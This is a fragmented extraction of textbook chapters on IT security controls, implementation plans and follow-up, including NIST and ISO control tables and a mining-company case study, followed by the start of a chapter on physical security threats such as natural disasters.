[Word Count: 9]

◆	List the various categories and types of controls available.
◆	Outline the process of selecting suitable controls to address risks.
◆	Outline an implementation plan to address identified risks.
◆	Understand the need for ongoing security implementation follow-up.
[Word Count: 39]

Figure 15.1  IT Security Management Controls and Implementation
[Word Count: 8]

control: An action, device, procedure, or other measure that reduces risk by 
eliminating or preventing a security violation, by minimizing the harm it can 
cause, or by discovering and reporting it to enable corrective action.
[Word Count: 35]

15.2 / security controls or safeguards   517
[Word Count: 7]

Some controls address multiple risks at the same time, and selecting such controls can 
be very cost effective. Controls can be classified as belonging to one of the following 
classes (although some controls include features from several of these):
[Word Count: 39]

• Management controls: Focus on security policies, planning, guidelines, and
[Word Count: 10]

standards that influence the selection of operational and technical controls to 
reduce the risk of loss and to protect the organization’s mission. These controls 
refer to issues that management needs to address. We discuss a number of 
these in Chapters 14 and 15.
 
• Operational controls: Address the correct implementation and use of
[Word Count: 53]

security policies and standards, ensuring consistency in security operations 
and correcting identified operational deficiencies. These controls relate to 
mechanisms and procedures that are primarily implemented by people rather
[Word Count: 28]

518    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

System protections
(least privilege, object reuse, process separation, etc.)
[Word Count: 9]

Protected communication
(safe from disclosure, substitution, modiﬁcation, and replay)
[Word Count: 9]

Figure 15.2  Technical Security Controls
[Word Count: 5]

than systems. They are used to improve the security of a system or group of 
systems. We discuss some of these in Chapters 16 and 17.
 
• Technical controls: Involve the correct use of hardware and software security
[Word Count: 38]

capabilities in systems. These range from simple to complex measures that 
work together to secure critical and sensitive data, information, and IT systems 
functions. Figure 15.2 illustrates some typical technical control measures. Parts 
One and Two in this text discuss aspects of such measures.
[Word Count: 44]

In turn, each of these control classes may include the following:
[Word Count: 11]

• Supportive controls: Pervasive, generic, underlying technical IT security
[Word Count: 9]

capabilities that are interrelated with, and used by, many other controls.
 
• Preventative controls: Focus on preventing security breaches from occurring,
[Word Count: 21]

by inhibiting attempts to violate security policies or exploit a vulnerability.
 
• Detection and recovery controls: Focus on the response to a security
[Word Count: 23]

breach, by warning of violations or attempted violations of security policies  
or the identified exploit of a vulnerability and by providing means to restore 
the resulting lost computing resources.
[Word Count: 29]

The technical control measures shown in Figure 15.2 include examples of each of 
these types of controls.
[Word Count: 17]

Table 15.1  NIST SP800-53 Security Controls
[Word Count: 6]

Management
Security Assessment and Authorization
[Word Count: 5]

Management
System and Services Acquisition
[Word Count: 5]

Operational
Physical and Environmental Protection
[Word Count: 5]

Operational
System and Information Integrity
[Word Count: 5]

Technical
Identification and Authentication
[Word Count: 4]

Technical
System and Communications Protection
[Word Count: 5]

15.2 / security controls or safeguards   519
[Word Count: 7]

520    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

Table 15.2  ISO/IEC 27002 Security Controls
[Word Count: 6]

Security Policies
To provide management direction and support for information security in accor-
dance with business requirements and relevant laws and regulations.
[Word Count: 22]

To establish a management framework to initiate and control the implementation 
and operation of information security within the organization, and to ensure the 
security of teleworking and use of mobile devices.
[Word Count: 31]

To ensure that employees and contractors understand their responsibilities and are 
suitable for the roles for which they are considered, and to ensure that employees 
and contractors are aware of and fulfill their information security responsibilities, 
and to protect the organization’s interests as part of the process of changing or ter-
minating employment.
[Word Count: 53]

Asset Management
To identify organizational assets and define appropriate protection responsibilities, 
and to ensure that information receives an appropriate level of protection in accor-
dance with its importance to the organization, and to prevent unauthorized disclo-
sure, modification, removal or destruction of information stored on media.
[Word Count: 46]

Access Control
To limit access to information and information processing facilities, and to ensure 
authorized user access and to prevent unauthorized access to systems and services, 
and to make users accountable for safeguarding their authentication information, 
and to prevent unauthorized access to systems and applications.
[Word Count: 45]

Cryptography
To ensure proper and effective use of cryptography to protect the confidentiality, 
authenticity and/or integrity of information.
[Word Count: 18]

To prevent unauthorized physical access, damage and interference to the organiza-
tion’s information and information processing facilities; to prevent loss, damage, 
theft or compromise of assets and interruption to the organization’s operations.
[Word Count: 32]

Operations Security
To ensure correct and secure operations of information processing facilities; to 
ensure that information and information processing facilities are protected against 
malware; to protect against loss of data; to record events and generate evidence; 
to ensure the integrity of operational systems to prevent exploitation of technical 
vulnerabilities.
[Word Count: 49]

To ensure the protection of information in networks and its supporting information 
processing facilities; maintain the security of information transferred within an orga-
nization and with an external entity.
[Word Count: 29]

System Acquisition, 
Development and 
Maintenance
[Word Count: 5]

To ensure that information security is an integral part of information systems across 
the entire lifecycle. This also includes the requirements for information systems 
which provide services over public networks; ensure that information security is 
designed and implemented within the development lifecycle of information systems; 
ensure the protection of data used for testing.
[Word Count: 53]

To maintain an agreed level of information security and service delivery in line with 
supplier agreements.
[Word Count: 16]

Information Security 
Incident Management
[Word Count: 4]

To ensure a consistent and effective approach to the management of information 
security incidents, including communication on security events and weaknesses.
[Word Count: 21]

To embed in the organization’s business continuity management systems; ensure 
availability of information processing facilities.
[Word Count: 15]

Compliance
To avoid breaches of legal, statutory, regulatory or contractual obligations related 
to information security and of any security requirements; ensure that information 
security is implemented and operated in accordance with the organizational policies 
and procedures.
[Word Count: 36]

15.2 / security controls or safeguards   521
[Word Count: 7]

Table 15.3  Detailed NIST SP800-53 Security Controls
[Word Count: 7]

Access Control 
Access Control Policy and Procedures, Account Management, Access Enforcement, Information Flow 
Enforcement, Separation of Duties, Least Privilege, Unsuccessful Login Attempts, System Use Notification, 
Previous Logon (Access) Notification, Concurrent Session Control, Session Lock, Permitted Actions without 
Identification or Authentication, Security Attributes, Remote Access, Wireless Access, Access Control for 
Mobile Devices, Use of External Information Systems, User-Based Collaboration and Information Sharing, 
Publicly Accessible Content
[Word Count: 64]

Awareness and Training
Security Awareness and Training Policy and Procedures, Security Awareness, Security Training, Security 
Training Records, Contacts with Security Groups and Associations
[Word Count: 23]

Audit and Accountability
Audit and Accountability Policy and Procedures, Auditable Events, Content of Audit Records, Audit Storage 
Capacity, Response to Audit Processing Failures, Audit Review, Analysis, and Reporting, Audit Reduction 
and Report Generation, Time Stamps, Protection of Audit Information, Nonrepudiation, Audit Record 
Retention, Audit Generation, Monitoring for Information Disclosure, Session Audit
[Word Count: 51]

Security Assessment and Authorization
Security Assessment and Authorization Policies and Procedures, Security Assessments, Information System 
Connections, Plan of Action and Milestones, Security Accreditation, Continuous Monitoring
[Word Count: 25]

Configuration Management
Configuration Management Policy and Procedures, Baseline Configuration, Configuration Change 
Control, Security Impact Analysis, Access Restrictions for Change, Configuration Settings, Least 
Functionality, Information System Component Inventory, Configuration Management Plan
[Word Count: 30]

Contingency Planning
Contingency Planning Policy and Procedures, Contingency Plan, Contingency Training, Contingency Plan 
Testing and Exercises, Alternate Storage Site, Alternate Processing Site, Telecommunications Services, 
Information System Backup, Information System Recovery and Reconstitution
[Word Count: 32]

Identification and Authentication
Identification and Authentication Policy and Procedures, Identification and Authentication (Organizational 
Users), Device Identification and Authentication, Identifier Management, Authenticator Management, 
Authenticator Feedback, Cryptographic Module Authentication, Identification and Authentication 
(Nonorganizational Users)
[Word Count: 32]

Incident Response
Incident Response Policy and Procedures, Incident Response Training, Incident Response Testing and 
Exercises, Incident Handling, Incident Monitoring, Incident Reporting, Incident Response Assistance, 
Incident Response Plan
[Word Count: 27]

Maintenance
System Maintenance Policy and Procedures, Controlled Maintenance, Maintenance Tools, Nonlocal 
Maintenance, Maintenance Personnel, Timely Maintenance
[Word Count: 16]

Media Protection
Media Protection Policy and Procedures, Media Access, Media Marking, Media Storage, Media Transport, 
Media Sanitization
[Word Count: 17]

Physical and Environmental Protection 
Physical and Environmental Protection Policy and Procedures, Physical Access Authorizations, Physical 
Access Control, Access Control for Transmission Medium, Access Control for Output Devices, Monitoring 
Physical Access, Visitor Control, Access Records, Power Equipment and Power Cabling, Emergency 
Shutoff, Emergency Power, Emergency Lighting, Fire Protection, Temperature and Humidity Controls, 
Water Damage Protection, Delivery and Removal, Alternate Work Site, Location of Information System 
Components, Information Leakage
[Word Count: 67]

522    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

[NIST06] suggests that adjustments may be needed for considerations related 
to the following:
[Word Count: 13]

• Technology: Some controls are only applicable to specific technologies, and
[Word Count: 11]

hence these controls are only needed if the system includes those technologies. 
Examples of these include wireless networks and the use of cryptography. 
Some may only be appropriate if the system supports the technology they 
require—for example, readers for access tokens. If these technologies  
are not supported on a system, then alternate controls, including administrative 
procedures or physical access controls, may be used instead.
 
• Common controls: The entire organization may be managed centrally and
[Word Count: 75]

may not be the responsibility of the managers of a specific system. Control 
changes would need to be agreed to and managed centrally.
[Word Count: 23]

Planning
Security Planning Policy and Procedures, System Security Plan, Rules of Behavior, Privacy Impact 
Assessment, Security-Related Activity Planning
[Word Count: 18]

Personnel Security
Personnel Security Policy and Procedures, Position Categorization, Personnel Screening, Personnel Termination, 
Personnel Transfer, Access Agreements, Third-Party Personnel Security, Personnel Sanctions
[Word Count: 22]

Risk Assessment
Risk Assessment Policy and Procedures, Security Categorization, Risk Assessment, Vulnerability Scanning
[Word Count: 13]

System and Services Acquisition
System and Services Acquisition Policy and Procedures, Allocation of Resources, Life Cycle Support, 
Acquisitions, Information System Documentation, Software Usage Restrictions, User Installed Software, 
Security Engineering Principles, External Information System Services, Developer Configuration Management, 
Developer Security Testing, Supply Chain Protection, Trustworthiness, Critical Information System Components
[Word Count: 48]

System and Information Integrity
System and Information Integrity Policy and Procedures, Flaw Remediation, Malicious Code Protection, 
Information System Monitoring, Security Alerts Advisories and Directives, Security Functionality Verification, 
Software and Information Integrity, Spam Protection, Information Input Restrictions, Information Input 
Validation, Error Handling, Information Output Handling and Retention, Predictable Failure Prevention
[Word Count: 49]

Program Management
Information Security Program Plan, Senior Information Security Officer, Information Security Resources, 
Plan of Action and Milestones Process, Information System Inventory, Information Security Measures of 
Performance, Enterprise Architecture, Critical Infrastructure Plan, Risk Management Strategy, Security 
Authorization Process, Mission/Business Process Definition
[Word Count: 41]

15.2 / security controls or safeguards   523
[Word Count: 7]

• Public access systems: Some systems, such as the organization’s public
[Word Count: 11]

Web server, are designed for access by the general public. Some controls, 
such as those relating to personnel security, identification, and authentication, 
would not apply to access via the public interface. They would apply to 
administrative control of such systems. The scope of application of such 
controls must be specified carefully.
[Word Count: 51]

• Infrastructure controls: Physical access or environmental controls are only
[Word Count: 10]

relevant to areas housing the relevant equipment.
[Word Count: 7]

• Scalability issues: Controls may vary in size and complexity in relation to the
[Word Count: 14]

organization employing them. For example, a contingency plan for systems 
critical to a large organization would be much larger and more detailed than 
that for a small business.
[Word Count: 28]

• Risk assessment: Controls may be adjusted according to the results of specific
[Word Count: 13]

risk assessment of systems in the organization, as we now consider.
[Word Count: 11]

If some form of informal or formal risk assessment process is being used, then 
it provides guidance on specific risks to an organization’s IT systems that need to 
be addressed. These will typically be some selection of operational or technical 
controls that together can reduce the likelihood of the identified risk occurring, the 
consequences if it does, or both, to an acceptable level. These may be in addition to 
those controls already selected in the baseline, or may simply be more detailed and 
careful specification and use of already selected controls.
[Word Count: 91]

The reduction in level of risk that results from implementing a new or 
enhanced control results from the reduction in threat likelihood or consequence 
that the control provides, as shown in Figure 15.3. The reduction in likelihood may 
result either by reducing the vulnerabilities (flaws or weaknesses) in the system or 
by reducing the capability and motivation of the threat source. The reduction in 
consequence occurs by reducing the magnitude of the adverse impact of the threat 
occurring in the organization.
[Word Count: 81]

524    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

It must then assess the implementation costs and benefits against system and data 
criticality to determine the importance of choosing this control.
[Word Count: 22]

Management must then determine which selection of controls provides an 
acceptable resulting level of risk to the organization’s systems. This selection will 
consider factors such as the following:
[Word Count: 28]

• If the control would reduce risk more than needed, then a less expensive
[Word Count: 14]

alternative could be used.
 
• If the control would cost more than the risk reduction provided, then an
[Word Count: 18]

alternative should be used.
 
• If a control does not reduce the risk sufficiently, then either more or different
[Word Count: 19]

controls should be used.
 
• If the control provides sufficient risk reduction and is the most cost effective,
[Word Count: 18]

It is often the case that the cost of implementing a control is more tangible and 
easily specified than the cost of not implementing it. Management must make a 
business decision regarding these ill-defined costs in choosing the final selection of 
controls and resulting residual risk.
[Word Count: 46]

Having identified a range of possible controls from which management has selected 
some to implement, an IT security plan should then be created, as indicated in 
Figures 14.1 and 15.1. This is a document that provides details as to what will be 
done, what resources are needed, and who will be responsible. The goal is to detail 
the actions needed to improve the identified deficiencies in the organization’s risk 
profile in a timely manner. [NIST12] suggests that this plan should include details of
[Word Count: 83]

• Risks (asset/threat/vulnerability combinations)
 
• Recommended controls (from the risk assessment)
[Word Count: 11]

• Disable external telnet access
• Use detailed auditing of privileged command use
• Set policy for strong admin passwords
• Set backup strategy for router configuration file
• Set change control policy for the router configuration
[Word Count: 37]

Selected Controls
• Strengthen access authentication
• Install intrusion detection software
[Word Count: 11]

• 3 days IT net admin time to change and verify router configuration, write policies
• 1 day of training for network administration staff
[Word Count: 24]

John Doe, Lead Network System Administrator, Corporate IT Support Team
[Word Count: 10]

Start to End Date
February 1, 2011 to February 4, 2011
[Word Count: 11]

Other Comments
• Need periodic test and review of configuration and policy use
[Word Count: 13]

• Action priority for each risk
 
• Selected controls (on the basis of the cost-benefit analysis)
 
• Required resources for implementing the selected controls
 
• Responsible personnel
 
• Target start and end dates for implementation
 
• Maintenance requirements and other comments
[Word Count: 41]

The next phase in the IT security management process, as indicated in Figure 14.1, is 
to manage the implementation of the controls detailed in the IT security plan. This 
comprises the do stage of the cyclic implementation model discussed in Chapter 14. 
The implementation phase comprises not only the direct implementation of the 
controls as detailed in the security plan, but also the associated specific training and 
general security awareness programs for the organization.
[Word Count: 74]

526    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

The implementation process should be monitored to ensure its correctness. 
This is typically performed by the organizational security officer, who checks that:
[Word Count: 22]

• The implementation costs and resources used stay within identified bounds.
 
• The controls are correctly implemented as specified in the plan, in order that
[Word Count: 25]

the identified reduction in risk level is achieved.
 
• The controls are operated and administered as needed.
[Word Count: 17]

When the implementation is successfully completed, management needs to 
authorize the system for operational use. This may be a purely informal process 
within the organization. Alternatively, especially in government organizations, 
this may be part of a formal process resulting in accreditation of the system  
as meeting required standards. This is usually associated with the installation, 
certification, and use of trusted computing system, as we discuss in Chapter 13.  
In these cases an external accrediting body will verify the documented evidence of 
the correct design and implementation of the system.
[Word Count: 89]

Appropriate security awareness training for all personnel in an organization, along 
with specific training relating to particular systems and controls, is an essential 
component in implementing controls. We discuss these issues further in Chapter 17, 
where we explore policies related to personnel security.
[Word Count: 43]

to do so can greatly increase the likelihood that a security failure will occur. This 
follow-up stage of the management process includes a number of aspects:
[Word Count: 26]

• Maintenance of security controls
 
• Security compliance checking
 
• Change and configuration management
 
• Incident handling
[Word Count: 17]

Any of these aspects might indicate that changes are needed to the previous stages in 
the IT security management process. An obvious example is that if a breach should 
occur, such as a virus infection of desktop systems, then changes may be needed to 
the risk assessment, to the controls chosen, or to the details of their implementation. 
This can trigger a review of earlier stages in the process.
[Word Count: 69]

The first aspect concerns the continued maintenance and monitoring of the 
implemented controls to ensure their continued correct functioning and 
appropriateness. It is important that someone has responsibility for this maintenance 
process, which is generally coordinated by the organization’s security officer.  
The maintenance tasks include ensuring that:
[Word Count: 47]

• Controls are periodically reviewed to verify that they still function as intended.
 
• Controls are upgraded when new requirements are discovered.
 
• Changes to systems do not adversely affect the controls.
 
• New threats or vulnerabilities have not become known.
[Word Count: 41]

This review includes regular analysis of log files to ensure various system 
components are functioning as expected, and to determine a baseline of activity 
against which abnormal events can be compared when handling incidents.  
We discuss security auditing further in Chapter 18.
[Word Count: 42]

The goal of maintenance is to ensure that the controls continue to perform as 
intended, and hence that the organization’s risk exposure remains as chosen. Failure 
to maintain controls could lead to a security breach with a potentially significant 
impact on the organization.
[Word Count: 43]

Security compliance checking is an audit process to review the organization’s security 
processes. The goal is to verify compliance with the security plan. The audit may be 
conducted using either internal or external personnel. It is generally based on the use 
of checklists, which verify that the suitable policies and plans have been created, that 
suitable controls were chosen, and that the controls are maintained and used correctly.
[Word Count: 68]

This audit process should be conducted on new IT systems and services 
once they are implemented; and on existing systems periodically, often as part of 
a wider, general audit of the organization or whenever changes are made to the 
organization’s security policy.
[Word Count: 42]

528    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

Change management is the process used to review proposed changes to systems for 
implications on the organization’s systems and use. Changes to existing systems can 
occur for a number of reasons, such as the following:
[Word Count: 35]

• Users reporting problems or desired enhancements
 
• Identification of new threats or vulnerabilities
 
• Vendor notification of patches or upgrades to hardware or software
 
• Technology advances
 
• Implementation of new IT features or services, which require changing existing
[Word Count: 40]

systems
 
• Identification of new tasks, which require changing existing systems
[Word Count: 11]

The impact of any proposed change on the organization’s systems should be 
evaluated. This includes not only security-related aspects, but wider operational 
issues as well. Thus change management is an important component of the general 
systems administration process. Because changes can affect security, this general 
process overlaps IT security management and must interact with it.
[Word Count: 55]

Ideally, most proposed changes should act to improve the security profile of 
a system. However, it is possible that for imperative business reasons a change is 
proposed that reduces the security of a system. In cases like this, it is important 
that the reasons for the change, its consequences on the security profile for the 
organization, and management authorization of it be documented. The benefits to 
the organization would need to be traded off against the increased risk level.
[Word Count: 79]

The change management process may be informal or formal, depending on the 
size of the organization and its overall IT management processes. In a formal process, 
any proposed change should be documented and tested before implementation. 
As part of this process, any related documentation, including relevant security 
documentation and procedures, should be updated to reflect the change.
[Word Count: 57]

Configuration management is concerned with specifically keeping track of the 
configuration of each system in use and the changes made to each. This includes lists 
of the hardware and software versions installed on each system. This information 
is needed to help restore systems following a failure (whether security related or 
not) and to know what patches or upgrades might be relevant to particular systems. 
Again, this is a general systems administration process with security implications 
and must interact with IT security management.
[Word Count: 82]

15.6 / case study: silver star mines   529
[Word Count: 8]

The procedures used to respond to a security incident comprise the final aspect 
included in the follow-up stage of IT security management. This topic is discussed 
further in Chapter 17, where we explore policies related to human factors.
[Word Count: 38]

• Configuration management policy and procedures
 
• Baseline configuration
 
• System maintenance policy and procedures
 
• Periodic maintenance
 
• Flaw remediation
 
• Malicious code protection
 
• Spam and spyware protection
[Word Count: 30]

Given that potential incidents are possible, attention should also be given to  
developing contingency plans to detect and respond to such incidents and to ena-
ble speedy restoration of system function. Attention should be paid to controls 
such as:
[Word Count: 39]

• Audit monitoring, analysis, and reporting
 
• Audit reduction and report generation
 
• Contingency planning policy and procedures
 
• Incident response policy and procedures
 
• Information system backup
 
• Information system recovery and reconstitution
[Word Count: 34]

These controls are generally applicable to all the identified risks and constitute 
good general systems administration practice. Hence, their cost effectiveness  
would be high because they provide an improved level of security across multiple 
identified risks.
[Word Count: 36]

530    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

The next three risks relate to the availability or integrity of the key Financial, 
Procurement, and Maintenance/Production systems. The generally applicable 
controls we identified should adequately address these risks once the controls are 
applied to all relevant servers.
[Word Count: 38]

The final risk relates to the availability, integrity, and confidentiality of e-mail. 
As was noted in the risk assessment, this is primarily the responsibility of the parent 
company’s IT group that manages the external mail gateway. There is a limited 
amount that can be done on the local site. The use of the generally applicable
[Word Count: 55]

15.6 / case study: silver star mines   531
[Word Count: 8]

controls, particularly those relating to malicious code protection and spam and 
spyware protection on client systems, will assist in reducing this risk. In addition, 
as part of the contingency planning and incident response policies and procedures, 
consideration could be given to a backup e-mail system. For security this system 
would use client systems isolated from the company intranet, connected to an 
external local network service provider. This connection would be used to provide 
limited e-mail capabilities for critical messages should the main company intranet 
e-mail system be compromised.
[Word Count: 88]

This analysis of possible controls is summarized in Table 15.5, which lists 
the controls identified and the priorities for their implementation. This table must 
be extended to include details of the resources required, responsible personnel, 
time frame, and any other comments. This plan would then be implemented, with 
suitable monitoring of its progress. Its successful implementation leads then to 
longer term follow-up, which should ensure that the new policies continue to be 
applied appropriately and that regular reviews of the company’s security profile 
occur. In time this should lead to a new cycle of risk assessment, plan development, 
and follow-up.
[Word Count: 100]

Table 15.5  Silver Star Mines—Implementation Plan
[Word Count: 6]

maintenance policy for servers
2. Malicious code (SPAM,
[Word Count: 8]

spyware) prevention
3. Audit monitoring, analysis,
[Word Count: 6]

reduction, and reporting on 
servers
4. Contingency planning and
[Word Count: 9]

incident response policies  
and procedures
5. System backup and recovery
[Word Count: 10]

Reliability and integrity  
of SCADA nodes and 
network
[Word Count: 8]

Integrity of stored file and 
database information
[Word Count: 7]

Extreme
1. Audit of critical documents
2. Document creation and
[Word Count: 10]

storage policy
3. User security education and
[Word Count: 7]

Availability and integrity of 
Financial, Procurement, and 
Maintenance/ Production 
Systems
[Word Count: 10]

Availability, integrity, and 
confidentiality of e-mail
[Word Count: 6]

532    Chapter 15 / IT Security Controls, Plans, and Procedures
[Word Count: 10]

More general discussion of the issues involved with IT security management is 
found in [MAIW02] and [SLAY06]. Current best practice in the field of IT security 
management is codified in a range of international and national standards, whose 
use is encouraged. These standards include [ISO13335], [ISO27001], [ISO27002], 
[ISO27005], [NIST06], [NIST09],  [NIST11], and [NIST12].
[Word Count: 53]

change management
configuration management
control
countermeasure
detection and recovery control
[Word Count: 10]

implementation plan
IT security plan
management control
operational control
preventative control
[Word Count: 11]

safeguard
security compliance
supportive control
technical control
[Word Count: 7]

15.8	Key Terms, Review Questions, and Problems
[Word Count: 7]

ISO13335  ISO/IEC, “ISO/IEC 13335-1:2004—Information technology—Security
[Word Count: 5]

techniques—Management of information and communications technology 
security—Part 1: Concepts and models for information and communications 
technology security management,” 2004.
ISO27001   ISO/IEC, “ISO/IEC 27001:2005—Information technology—Security
[Word Count: 24]

techniques—Information security management systems—Requirements,” 2005.
ISO27002  ISO/IEC, “ISO/IEC 27002:2005—Information technology—Security
[Word Count: 10]

techniques—Code of practice for information security management,” 2005. 
Formerly known as ISO/IEC 17755:2005.
ISO27005  ISO/IEC, “ISO/IEC 27005:2011—Information technology—Security
[Word Count: 18]

techniques—Information security risk management,” 2011.
MAIW02  Maiwald, E., and Sieglein, W. Security Planning & Disaster Recovery,
[Word Count: 16]

Berkeley, CA: McGraw-Hill/Osborne, 2002.
NIST06     National Institute of Standards and Technology. Guide for Developing
[Word Count: 14]

Security Plans for Federal Information Systems. Special Publication 800-18 
Revision 1, February 2006.
NIST09     National Institute of Standards and Technology. Recommended Security
[Word Count: 22]

Controls for Federal Information Systems. Special Publication 800-53 
Revision 3, August 2009.
NIST11     National Institute of Standards and Technology. Managing Information
[Word Count: 21]

Security Risk: Organization, Mission, and Information System View. Special 
Publication 800-39, March 2011.
NIST12     National Institute of Standards and Technology. Risk Management Guide
[Word Count: 23]

for Information Technology Systems. Special Publication  800-30 Revision 1, 
September 2012.
SLAY06   Slay, J., and Koronios, A. Information Technology Security & Risk
[Word Count: 22]

Management, Milton, QLD: John Wiley & Sons Australia, 2006.
[Word Count: 9]

15.8 / Key Terms, Review Questions, and Problems   533
[Word Count: 9]

Natural Disasters
 Environmental Threats
 Technical Threats
 Human-Caused Physical Threats
[Word Count: 9]

16.3	 Physical Security Prevention and Mitigation Measures
[Word Count: 7]

Environmental Threats
 Technical Threats
 Human-Caused Physical Threats
[Word Count: 7]

16.4	 Recovery From Physical Security Breaches
[Word Count: 6]

16.5	 Example: A Corporate Physical Security Policy
[Word Count: 7]

16.6	 Integration of Physical and Logical Security
[Word Count: 7]

Personal Identity Verification
 Use of PIV Credentials in Physical Access Control Systems
[Word Count: 12]

16.8	 Key Terms, Review Questions, and Problems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Provide an overview of various types of physical security threats.
◆	Assess the value of various physical security prevention and mitigation
[Word Count: 22]

­measures.
◆	Discuss measures for recovery from physical security breaches.
◆	Understand the role of the personal identity verification (PIV) standard in
[Word Count: 22]

physical security.
◆	Explain the use of PIV mechanisms as part of a physical access control
[Word Count: 16]

[PLAT14] distinguishes three elements of information system (IS) security:
[Word Count: 9]

• Logical security: Protects computer-based data from software-based and
[Word Count: 9]

­communication-based threats. The bulk of this book deals with logical security.
 
• Physical security: Also called infrastructure security. Protects the ­information
[Word Count: 21]

systems that contain data and the people who use, operate, and maintain the 
systems. Physical security also must prevent any type of physical access or 
intrusion that can compromise logical security.
 
• Premises security: Also known as corporate or facilities security. Protects the
[Word Count: 43]

people and property within an entire area, facility, or building(s), and is usually 
­required by laws, regulations, and fiduciary obligations. Premises security provides 
perimeter security, access control, smoke and fire detection, fire suppression, some 
environmental protection, and usually surveillance systems, alarms, and guards.
[Word Count: 43]

This chapter is concerned with physical security and with some overlapping 
areas of premises security. We survey a number of threats to physical security and 
a number of approaches to prevention, mitigation, and recovery. To implement 
a physical security program, an organization must conduct a risk assessment to 
­determine the amount of resources to devote to physical security and the allocation 
of those resources against the various threats. This process also applies to logical 
security. This assessment and planning process is covered in Chapters 14 and 15.
[Word Count: 87]

For information systems, the role of physical security is to protect the physical assets 
that support the storage and processing of information. Physical security involves 
two complementary requirements. First, physical security must prevent damage to 
the physical infrastructure that sustains the information system. In broad terms, that 
infrastructure includes the following:
[Word Count: 51]

• Information system hardware: Includes data processing and storage
[Word Count: 9]

­equipment, transmission and networking facilities, and offline storage media. 
We can include in this category supporting documentation.
[Word Count: 17]

536    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

• Physical facility: The buildings and other structures housing the system and
[Word Count: 12]

network components.
 
• Supporting facilities: These facilities underpin the operation of the ­information
[Word Count: 13]

system. This category includes electrical power, communication services, and 
environmental controls (heat, humidity, etc.).
 
• Personnel: Humans involved in the control, maintenance, and use of the
[Word Count: 26]

Second, physical security must prevent misuse of the physical infrastructure 
that leads to the misuse or damage of the protected information. The misuse of the 
physical infrastructure can be accidental or malicious. It includes vandalism, theft of 
equipment, theft by copying, theft of services, and unauthorized entry.
[Word Count: 47]

In this section, we look at the types of physical situations and occurrences that can 
constitute a threat to information systems. There are a number of ways in which such 
threats can be categorized. It is important to understand the spectrum of threats to 
information systems so that responsible administrators can ensure that prevention 
measures are comprehensive. We organize the threats into the following categories:
[Word Count: 65]

• Environmental threats
 
• Technical threats
 
• Human-caused threats
[Word Count: 9]

We begin with a discussion of natural disasters, which are a prime, but not the only, 
source of environmental threats. Then we look specifically at environmental threats, 
followed by technical and human-caused threats.
[Word Count: 33]

Natural disasters are the source of a wide range of environmental threats to data 
centers, other information processing facilities, and their personnel. It is possible to 
assess the risk of various types of natural disasters and take suitable precautions so 
that catastrophic loss from natural disaster is prevented.
[Word Count: 48]

Table 16.1 lists six categories of natural disasters, the typical warning time for 
each event, whether or not personnel evacuation is indicated or possible, and the 
typical duration of each event. We comment briefly on the potential consequences 
of each type of disaster.
[Word Count: 43]

A tornado can generate winds that exceed hurricane strength in a narrow 
band along the tornado’s path. There is substantial potential for structural ­damage, 
roof ­damage, and loss of outside equipment. There may be damage from wind and 
flying debris. Off site, a tornado may cause a temporary loss of local utility and 
­communications. Off-site damage is typically followed by quick restoration of services. 
Tornado damage severity is measured by the Fujita Tornado Scale (Table 16.2).
[Word Count: 76]

Hurricanes, tropical storms, and typhoons, collectively known as tropical 
cyclones, are among the most devastating naturally occurring hazards. Depending
[Word Count: 19]

Table 16.1  Characteristics of Natural Disasters
[Word Count: 6]

Tornado
Advance warning of  
potential; not site specific
[Word Count: 8]

Hurricane
Significant advance warning
May require evacuation
Hours to a few days
[Word Count: 12]

Earthquake
No warning
May be unable to 
evacuate
[Word Count: 8]

Brief duration; threat of  
continued aftershocks
[Word Count: 6]

Several days warning  
generally expected
[Word Count: 5]

May be unable to evacuate
May last several days
[Word Count: 9]

Lightning
Sensors may provide  
minutes of warning
[Word Count: 7]

May require evacuation
Brief but may recur
[Word Count: 7]

Flood
Several days warning  
generally expected
[Word Count: 6]

May be unable to evacuate
Site may be isolated for 
extended period
[Word Count: 12]

Table 16.2  Fujita Tornado Intensity Scale
[Word Count: 6]

Category
Wind Speed Range
Description of Damage
[Word Count: 7]

Light damage. Some damage to chimneys; tree branches broken off; 
shallow-rooted trees pushed over; sign boards damaged.
[Word Count: 17]

Moderate damage. The lower limit is the beginning of hurricane 
wind speed; roof surfaces peeled off; mobile homes pushed off 
­foundations or overturned; moving autos pushed off the roads.
[Word Count: 29]

Considerable damage. Roofs torn off houses; mobile homes 
­demolished; boxcars pushed over; large trees snapped or uprooted; 
light-object missiles generated.
[Word Count: 20]

Severe damage. Roofs and some walls torn off well-constructed 
houses; trains overturned; most trees in forest uprooted; heavy cars 
lifted off ground and thrown.
[Word Count: 24]

Devastating damage. Well-constructed houses leveled; structures 
with weak foundation blown off some distance; cars thrown and 
large missiles generated.
[Word Count: 19]

Incredible damage. Strong frame houses lifted off foundations and 
carried considerable distance to disintegrate; automobile-sized 
­missiles fly through the air in excess of 100 yards; trees debarked.
[Word Count: 27]

on strength, cyclones may also cause significant structural damage and damage to 
outside equipment at a particular site. Off site, there is the potential for severe 
regionwide damage to public infrastructure, utilities, and communications. If ­on-site 
operation must continue, then emergency supplies for personnel as well as a backup 
generator are needed. Further, the responsible site manager may need to mobilize 
private poststorm security measures, such as armed guards.
[Word Count: 69]

Table 16.3 summarizes the widely used Saffir/Simpson Hurricane Scale. In 
general, damage rises by about a factor of four for every category increase [PIEL08].
[Word Count: 24]

538    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

Table 16.3  Saffir/Simpson Hurricane Scale
[Word Count: 5]

An ice storm or blizzard can cause some disruption of or damage to IS ­facilities 
if outside equipment and the building are not designed to survive severe ice and 
snow accumulation. Off site, there may be widespread disruption of utilities and 
communications and roads may be dangerous or impassable.
[Word Count: 49]

The consequences of lightning strikes can range from no impact to disaster. 
The effects depend on the proximity of the strike and the efficacy of grounding and 
surge protection measures in place. Off site, there can be disruption of electrical 
power and there is the potential for fires.
[Word Count: 48]

Flood is a concern in areas that are subject to flooding and for facilities that 
are in severe flood areas at low elevation. Damage can be severe, with long-lasting 
